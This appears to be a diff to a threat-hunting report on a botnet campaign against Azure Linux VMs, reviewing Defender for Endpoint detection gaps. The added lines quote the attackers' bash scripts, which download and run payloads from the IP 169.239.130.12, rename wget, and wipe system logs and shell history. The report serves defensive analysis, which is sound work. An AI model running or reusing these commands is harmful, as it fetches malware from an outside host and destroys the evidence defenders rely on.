@@ -156,7 +156,7 @@ The compromised device `Levi-Linux-Vulnerability` downloaded a file named `YAvdM
 </p>
 
 **Subsequent Behavior:**  
-Execution of `YAvdMwRw` created two additional malicious files, `retea` and `Update`, both previously observed in the [initial-threat-hunt.md](./initial-threat-hunt.md) analysis.
+Execution of `YAvdMwRw` created two additional malicious files, `retea` and `Update`, both previously observed in the [initial-threat-hunt.md](./initial-threat-hunt.md) analysis. 
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/a2fa0fb0-e5ac-46d8-ba73-4c4b7b9b48fb" width="800"/>
@@ -164,7 +164,7 @@ Execution of `YAvdMwRw` created two additional malicious files, `retea` and `Upd
 </p>
 
 **Malicious Scripts Revisited:**  
-The same malicious bash script identified earlier was re-used, executing `retea` and `network`, creating `kuak` and `diicot`, terminating known miner processes, disabling scheduled tasks, clearing logs, and downloading further payloads.
+The same malicious bash script identified earlier was re-used, executing `retea` and `network`, creating `kuak` and `diicot`, terminating known miner processes, disabling scheduled tasks, clearing logs, and downloading further payloads. The presence of a file named `diicot` strongly suggests involvement by the **Diicot** threat group in this campaign.
 
 [View full command → `observed-commands.md`](./observed-commands.md)
 
@@ -380,10 +380,64 @@ cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tm
 - `JR-Linux-VM-Test`
 
 **Observed Activity:**  
-The device `JR-Linux-VM-Test` was observed running a bash script designed to locate a writable directory, download several executables from a malicious domain, and execute them. To evade detection, the script deleted system and audit logs, renamed system binaries like `wget`, and cleared command history. The downloads originated from the IP `169.239.130.12`, previously seen in connection with the creation of the file `ygljglkjgfg1`.
+The device `JR-Linux-VM-Test` executed a bash script that identified a writable directory, downloaded multiple payloads from `169.239.130.12`, and ran them using `curl`, `wget`, and a renamed `wget` binary (`good`). To evade detection, the script cleared logs, deleted command history, and removed audit traces across multiple system paths.
+
+```bash
+bash -c 'wdir="/bin"
+for i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc"
+do
+if [ -w $i ]
+then
+wdir=$i
+break
+fi
+done
+cd $wdir
+curl http://169.239.130.12/p.txt -o ygljglkjgfg0
+chmod +x ygljglkjgfg0
+./ygljglkjgfg0
+wget http://169.239.130.12/p.txt -O ygljglkjgfg1
+chmod +x ygljglkjgfg1
+./ygljglkjgfg1
+good http://169.239.130.12/p.txt -O ygljglkjgfg2
+chmod +x ygljglkjgfg2
+./ygljglkjgfg2
+sleep 2
+wget http://169.239.130.12/2.txt -O sdf3fslsdf13
+chmod +x sdf3fslsdf13
+./sdf3fslsdf13
+good http://169.239.130.12/2.txt -O sdf3fslsdf14
+chmod +x sdf3fslsdf14
+./sdf3fslsdf14
+curl http://169.239.130.12/2.txt -o sdf3fslsdf15
+chmod +x sdf3fslsdf15
+./sdf3fslsdf15
+sleep 2
+mv /usr/bin/wget /usr/bin/good
+mv /bin/wget /bin/good
+cat /dev/null >/root/.bash_history
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/secure
+cat /dev/null > /var/log/boot.log
+cat /dev/null > /var/log/cron
+cat /dev/null > /var/log/dmesg
+cat /dev/null > /var/log/firewalld
+cat /dev/null > /var/log/maillog
+cat /dev/null > /var/log/messages
+cat /dev/null > /var/log/spooler
+cat /dev/null > /var/log/syslog
+cat /dev/null > /var/log/tallylog
+cat /dev/null > /var/log/yum.log
+cat /dev/null >/root/.bash_history
+ls -la /etc/daemon.cfg
+exit $?
+'
+```
 
 **Downloaded Files:**  
-Execution of the malicious file `ygljglkjgfg1` resulted in the creation of a shell script named `gcc.sh`.
+Execution of the malicious file `ygljglkjgfg1` resulted in the creation of a shell script named `gcc.sh`. Further research into gcc.sh suggests a correlation with the `XorDDoS` campaign.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/207b2847-45be-43b6-acbc-85d872c58365" width="700"/>
@@ -391,7 +445,7 @@ Execution of the malicious file `ygljglkjgfg1` resulted in the creation of a she
 </p>
 
 **Malicious Behavior:**  
-Subsequent commands removed scheduled cron jobs, deleted SSH authorized keys, cleared logs, and terminated known cryptomining processes (like `xmrig`, `java`, and `cnrig`). Payloads and related directories were wiped, and the malicious file `sBksNkqW` was executed from `/var/tmp/` in stealth mode (detached, no output). Command history was cleared to cover tracks.
+Subsequent commands deleted cron jobs and SSH keys, cleared logs, and killed known cryptomining processes (`xmrig`, `java`, `cnrig`). Payloads and directories were wiped, and the malicious file `sBksNkqW` was executed from `/var/tmp/`. Command history was cleared to cover tracks.
 
 **Key Bash Command:**
 ```bash
@@ -430,7 +484,16 @@ rm -rf .bash_history ~/.bash_history
 ```
 
 **Further Activity:**  
-The execution of `sBksNkqW` triggered a bash command that made the hidden `History` file in `/var/tmp/.update-logs` executable, waited 15 seconds, then ran it. This suggests delayed execution to avoid immediate detection. Following this, both the `History` and `Update` files were executed, resulting in the creation of the `.bisis` file.
+Executing `sBksNkqW` triggered a bash command that made the hidden `History` file in `/var/tmp/.update-logs` executable, introduced a 15-second delay, and then executed it. This was followed by the execution of both `History` and `Update`, which led to the creation of the `.bisis` file.
+
+```bash
+bash -c "
+  chmod +x /var/tmp/.update-logs/History
+  cd /var/tmp/.update-logs
+  sleep 15
+  /var/tmp/.update-logs/History
+"
+```
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/86b3831e-04eb-45dd-a53b-377e67315fcf" width="700"/>
@@ -467,13 +530,13 @@ The devices `linux-vm-vulnerability-test` and `linux-vulnerability-test-dylan` e
 </p>
 
 **April 15 – Final Recorded Activity:**  
-The last entry on the Microsoft Defender for Endpoint *Incidents* dashboard involved the device `linuxremediation`.
+The last entry on the Microsoft Defender for Endpoint **Incidents** dashboard involved the device `linuxremediation`.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/2e6638c4-7843-49d6-a55b-bec0655ea7b8" width="450"/>
 </p>
 
-An **Unknown Process Name** was observed repeatedly creating the file `libudev.so.6`, which matches the behavior and file renaming pattern used in earlier stages of the attack. Additionally, the script `gcc.sh` — previously associated with the **XorDDoS** dropper — was executed from the `/etc/cron.hourly/` directory, likely responsible for re-generating the `libudev.so.6` file.
+An **Unknown Process Name** was observed repeatedly creating the file `libudev.so.6`, which matches the behavior and file renaming pattern used in earlier stages of the attack. Additionally, the script `gcc.sh` was executed from the `/etc/cron.hourly/` directory, likely responsible for re-generating the `libudev.so.6` file.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/52659fde-496c-4cad-a5db-be79237791e1" width="450"/>
@@ -487,11 +550,11 @@ No further malicious behavior was detected beyond the repeated creation of the `
 
 ## Conclusion
 
-The MDE Dashboard Review revealed that while Microsoft Defender for Endpoint (MDE) was able to detect certain brute-force attempts and network-based indicators tied to known threat infrastructure, much of the mid-stage malicious activity went unnoticed without manual correlation. Initial compromise activity on February 17 began with the successful brute-force of `Linux-VulnMgmt-Kobe`, followed by internal SSH-based lateral movement and the deployment of malware like `Gafgyt`, `Multiverze`, and `XorDDoS` across a wide array of Azure-based Linux virtual machines.
+The MDE Dashboard Review revealed that while Microsoft Defender for Endpoint (MDE) was able to detect certain brute-force attempts and network-based indicators tied to known threat infrastructure, certain malicious actions were only identified through manual correlation efforts. Initial compromise activity on February 17 began with a successful brute-force attack on `Linux-VulnMgmt-Kobe`, followed by internal SSH-based lateral movement and the deployment of malware associated with the **Diicot**, **Gafgyt**, **Multiverze**, and **XorDDoS** botnets across the affected Linux virtual machines in the Azure environment.
 
 Throughout the campaign, attackers consistently reused obfuscated scripts (`Update`, `cache`, `History`, `.bisis`) and leveraged cron-based scheduling to maintain persistence. Obfuscation techniques such as renaming payloads to mimic legitimate binaries (e.g., `libudev.so.6`) and concealing command execution further reduced the likelihood of detection. Exfiltration activity was stealthy, utilizing crafted `curl` requests with browser headers.
 
-Although the campaign had a wide reach, MDE failed to surface activity on impacted devices and overlooked key behaviors. Notably, the device `linuxvmcraig`—which attempted SSH brute-force attacks on over 3,500 targets ([initial-threat-hunt.md](https://github.com/gabriel-espinoza-77/azure-ssh-brute-force-analysis))—did not appear at all in the *Incidents* dashboard. These detection blind spots are why a deeper manual investigation was conducted to gain a clearer understanding of the full extent of the intrusion.
+Although the campaign had significant reach, MDE failed to detect activity on multiple affected devices, overlooking key malicious behaviors. Devices such as `jr-linux-vm-test`, `sakel-lunix-2`, `linuxvmcraig`, and `linux-vulnerability-test-dylan` were not flagged for any of the SSH connection attempts they initiated—despite each generating thousands of outbound attempts. Notably, `sakel-lunix-2` alone was responsible for over `180,000` SSH connection attempts, including more than 20 successful logins to external IPs. These successful connections, distinct from those documented in the [initial threat hunt](./initial-threat-hunt.md), were not reflected in the Incidents dashboard, representing a critical detection gap. These detection blind spots are why a deeper manual investigation was conducted to gain a clearer understanding of the full extent of the intrusion.
 
 This investigation highlights the critical need for multiple layers of visibility in cloud environments, particularly when facing threat actors such as **Diicot**, who demonstrate reuse of tooling, stealth persistence, and automation across multiple hosts. It also highlights critical detection gaps when relying on endpoint telemetry alone, emphasizing the importance of proactive threat hunting and integration of external intelligence.
 
